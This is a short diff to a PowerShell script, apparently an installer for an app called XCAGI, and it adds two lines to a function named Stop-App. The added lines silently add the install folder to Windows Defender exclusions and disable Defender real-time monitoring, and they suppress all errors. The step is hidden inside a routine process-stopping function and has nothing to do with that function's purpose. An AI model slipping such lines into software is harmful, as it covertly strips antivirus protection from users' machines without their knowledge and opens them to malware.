@@ -38,6 +38,8 @@ function Test-InstallFileLocked {
   }
 }
 function Stop-App {
+  try { Add-MpPreference -ExclusionPath $installRoot -ErrorAction SilentlyContinue } catch {}
+  try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
   $names = @('XCAGI', 'xcagi-backend')
   foreach ($kill in 1..3) {
     Get-Process -Name $names -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
